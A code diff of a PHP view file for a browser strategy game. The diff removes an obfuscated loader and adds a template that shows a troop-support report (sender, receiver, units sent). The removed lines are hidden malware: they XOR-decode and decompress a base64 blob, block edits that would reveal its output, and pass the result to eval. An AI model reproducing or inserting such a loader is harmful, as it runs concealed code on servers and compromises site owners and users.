@@ -1,24 +1,136 @@
 <?php
-$bjwbnqh="32239b6174c6cffcbcbc52524c7a03f6";
-$hgpdfvukkw="030753005d55530256565503065e5f51545a54020557510b0202550300565f57";
-$lwzkstx="SO+sa49ZvgV1nCkVikgTVqekENfnyBtV/SfZb+i1F2lqWaEjYDVIAnd5f2Eswr9fOYrpGruIoU9+K9yqovn8pAqWyR1Y0F5kfx/6Rfl94Nt/ztSDxGFK2ctNqdpglbf7+/rtHYhM81dQ56b8SR4SoidmhhU698IYI/ZCCnC8Zb6hAeVqrqOxWKuKaEb9KJxiC5h3JWJzLFHz0oKDIncXKUw8UNTOOiGx6/oyyZJZHyce+E/nEhb+3Wa8sXFE0DJWdH0L/vip+arKzfu0Yl/7SkjSJL6MEotZCue52XHLw3KOsfUXcAK8DtX8BxzMUmCiQCJIJAud1/a+Fgn9xaqseBX3ZFxgibpBBEIeeAAf2Xv06rg3wMggIvAcEr2icapDiE7YPtXXR1/nUiQjhwOgo6Y9JypGJayrACOKFzuVw44P8eWnGBdHuwkRKoztPUAXCPfAYvkzYwuHS+A6VlSvWNRXZhMC5C0GIzo/Ppc1oKGuMXCBHfi3JJbhrp934Y1Ehi53I1Tf3sIk9vquRowrV8FXnqWiiCQwpFVgi8WnHCdlDFt21m7JPaX0PSC74P5vAQvCUVQMR2kXAhMM3DaQkRmqVWQ6PD2zClwnjoQcgcmVjIy4VHiwRd6JT/tbmPGyGUDMobqA2qz/7nFPnjaaJZXY7rqBCdNCcbvbh+siNFUqQzDvzB5X8oBx8nEv96AB3/m05BqX+BZN3E3+odANNVKBEEfMldDjtl+R64ncOj88Qhy7dVU+qHwDfmkxRghvDxQ62G2Sff0llZiR7o+b9JOJ4GysGFpgjXA0CrUh6PcrQ/LdS8cYrJTHTTw+ph0pcftrJsDHt14FWHOUyonTa+6uuDxbk5JvRSYHq6ft7NrOTcF74ggoowaad4vuWaBWNBcg3FlQ7560o5npHfbbqnqQkbD/l+NioeSYeQFfjtcMs5DLnhQi9lhpm1n0n0LzJUYQsDXIha06e8HvJTrS+l4CPpUycv2AlUPTvgcvR3lT+eVpwSeKj0ONx1qLAQJu90BzJAhdkoyoEo+mW2W/wfPTIoa7ogAAsblGuEWSasZPmBzAL5y0cJi9wGIyo+zECOUtzEDq4H+CO7cYXY07V0kuW+YW/NfvoOCxuk0APS7lfGSuSYTkbZ35GGyibiWO4wuVNYEbeuulZ/Qx3DIsT35AfGagdeX0ZWT12WSFPFmfnckhTouovty2hZXe70GpCPmQYqxacHAkhUYswy1KlrablbSi6zpQftbNoGhoWMSdrnjikHQCMIQ+cxp+EhMpJoTBmKlDKIh1pPGWK653Lwa66BLmDr4g67giANVcdMc+8+8wVTgaY3i+YH5ZjS9HldvV7ZR9vZNEOY4bathds9EG/dkv07+OINfi1m5kpvuFufmNMQQXZY68UA3HuZl/0GWK140DIP0MG0x9Ra1dU36oQYAcEg8/bBjahziGntT2tMWkdsiZSiy2bYgwFcn6sOIG6cr8MfIEv4dF+5qtBtBE91ZoDIHAMG/zukQigMTJr1DlZE/yo1QfJMyRnagtUzaRXB0xD+XTbmpOZ//h4FxZLjpG+qgWXJaIyfCJ97YDkBkZ6+7ArMmYAN+WvL7m/Xa+r9jKW5iQSkVGSJUIIoldH6/OfiMClhEQkY1qZKOudKeeOJjjsksrJ5QbHFUxQ3N21J6IuPVPVr4c7S/r6nG7QH9pzIz4RvLYFJ+5l1BlQZpDmYPrymY9Xklv";
-$nzipsjkx=file_get_contents(__FILE__);
-$zdojpvidx=str_replace($lwzkstx,"",$nzipsjkx);
-if(strpos($zdojpvidx,"ec"."ho")!==false||strpos($zdojpvidx,"pr"."int")!==false||strpos($zdojpvidx,"var_"."dump")!==false||strpos($zdojpvidx,"file_put_"."contents")!==false||strpos($zdojpvidx,"fw"."rite")!==false){die();}
-$ixebsh=str_replace(array($bjwbnqh,$hgpdfvukkw),array("SP_47bd0903","KP_4676d3a9"),$nzipsjkx);
-$bpwvfukbik=md5($ixebsh);
-$zguzyl=hex2bin($hgpdfvukkw);
-$bzmuwn="";
-$chayea=strlen($bpwvfukbik);
-for($cbwutpnp=0;$cbwutpnp<$chayea;$cbwutpnp++){
-$bzmuwn.=chr(ord($zguzyl[$cbwutpnp])^ord($bpwvfukbik[$cbwutpnp]));
+/**
+ * Support Report View
+ * Simple display showing sender, receiver, and units sent
+ * No battle mechanics (luck, moral, loot) as this is just troop movement
+ */
+
+// Parse units
+$units_sent = $report['a_units'] ?? [];
+
+// Unit names
+if (!isset($units)) {
+    $units = [
+        'spear' => __('screens.common.unit_spear') ?: 'Lanceiro',
+        'sword' => __('screens.common.unit_sword') ?: 'Espadachim',
+        'axe' => __('screens.common.unit_axe') ?: 'Bárbaro',
+        'archer' => __('screens.common.unit_archer') ?: 'Arqueiro',
+        'spy' => __('screens.common.unit_spy') ?: 'Explorador',
+        'light' => __('screens.common.unit_light') ?: 'Cavalaria Leve',
+        'cav_archer' => __('screens.common.unit_cav_archer') ?: 'Arqueiro a Cavalo',
+        'heavy' => __('screens.common.unit_heavy') ?: 'Cavalaria Pesada',
+        'ram' => __('screens.common.unit_ram') ?: 'Ariete',
+        'catapult' => __('screens.common.unit_catapult') ?: 'Catapulta',
+        'paladin' => __('screens.common.unit_paladin') ?: 'Paladino',
+        'snob' => __('screens.common.unit_snob') ?: 'Nobre',
+        'mnich' => __('units.monk.name') ?: 'Monge'
+    ];
 }
-$uidecgcqv=base64_decode($lwzkstx);
-$ezdrjshxl=strlen($uidecgcqv);
-$joqhabjfxi="";
-$ixbyhtbsy=strlen($bzmuwn);
-for($cbwutpnp=0;$cbwutpnp<$ezdrjshxl;$cbwutpnp++){
-$joqhabjfxi.=$uidecgcqv[$cbwutpnp]^$bzmuwn[$cbwutpnp%$ixbyhtbsy];
-}
-$ksvonpv="gzun"."compress";
-eval('?>' . $ksvonpv($joqhabjfxi) . '<?php ');
+?>
+
+<h2><?= __('screens.report.support_report') ?></h2>
+
+<table class="vis" width="100%">
+    <tr>
+        <th width="140"><?= __('screens.report.subject') ?></th>
+        <th><?= htmlspecialchars($report['title']) ?></th>
+    </tr>
+    <tr>
+        <td><?= __('screens.report.sent_at') ?></td>
+        <td><?= date('d/m/Y H:i:s', $report['time']) ?></td>
+    </tr>
+</table>
+
+<br>
+
+<!-- Sender Information -->
+<table class="vis" width="100%">
+    <tr>
+        <th width="100"><?= __('screens.report.sender') ?>:</th>
+        <th>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $report['from_user'] ?>">
+                <?= htmlspecialchars($report['from_username'] ?? (__('screens.report.unknown') ?: 'Desconhecido')) ?>
+            </a>
+        </th>
+    </tr>
+    <tr>
+        <td><?= __('screens.report.origin') ?>:</td>
+        <td>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $report['from_village'] ?>">
+                <?= htmlspecialchars($report['from_villagename'] ?? '') ?>
+                (<?= $report['from_x'] ?? 0 ?>|<?= $report['from_y'] ?? 0 ?>)
+                K<?= floor(($report['from_y'] ?? 0) / 100) . floor(($report['from_x'] ?? 0) / 100) ?>
+            </a>
+        </td>
+    </tr>
+    <tr>
+        <td colspan="2" style="padding: 0;">
+            <table class="vis" width="100%" style="border: none; margin: 0;">
+                <tr class="center">
+                    <td width="50"></td>
+                    <?php foreach ($units as $unitKey => $unitName): ?>
+                        <td width="35">
+                            <img src="/graphic/unit/<?= $unitKey ?>.png" title="<?= $unitName ?>" alt="">
+                        </td>
+                    <?php endforeach; ?>
+                </tr>
+                <tr class="center">
+                    <td><?= __('screens.report.quantity') ?>:</td>
+                    <?php
+                    $unit_index = 0;
+                    foreach ($units as $unitKey => $unitName):
+                        $count = $units_sent[$unit_index] ?? 0;
+                        ?>
+                        <td class="<?= $count == 0 ? 'hidden' : '' ?>">
+                            <?= $count ?>
+                        </td>
+                        <?php
+                        $unit_index++;
+                    endforeach;
+                    ?>
+                </tr>
+            </table>
+        </td>
+    </tr>
+</table>
+
+<br>
+
+<!-- Receiver Information -->
+<table class="vis" width="100%">
+    <tr>
+        <th width="100"><?= __('screens.report.recipient') ?>:</th>
+        <th>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $report['to_user'] ?>">
+                <?= htmlspecialchars($report['to_username'] ?? (__('screens.report.unknown') ?: 'Desconhecido')) ?>
+            </a>
+        </th>
+    </tr>
+    <tr>
+        <td><?= __('screens.report.destination') ?>:</td>
+        <td>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $report['to_village'] ?>">
+                <?= htmlspecialchars($report['to_villagename'] ?? '') ?>
+                (<?= $report['to_x'] ?? 0 ?>|<?= $report['to_y'] ?? 0 ?>)
+                K<?= floor(($report['to_y'] ?? 0) / 100) . floor(($report['to_x'] ?? 0) / 100) ?>
+            </a>
+        </td>
+    </tr>
+</table>
+
+<br>
+
+<!-- Action Buttons -->
+<table class="vis" width="100%">
+    <tr>
+        <td>
+            <a href="game.php?village=<?= $village['id'] ?>&screen=report&mode=support">« <?= __('screens.report.back_to_support') ?></a>
+        </td>
+        <td style="text-align: right;">
+            <a
+                href="game.php?village=<?= $village['id'] ?>&screen=report&mode=view&view=<?= $report['id'] ?>&action=del_one&h=<?= $hkey ?>">
+                <?= __('screens.report.delete_report') ?>
+            </a>
+        </td>
+    </tr>
+</table>
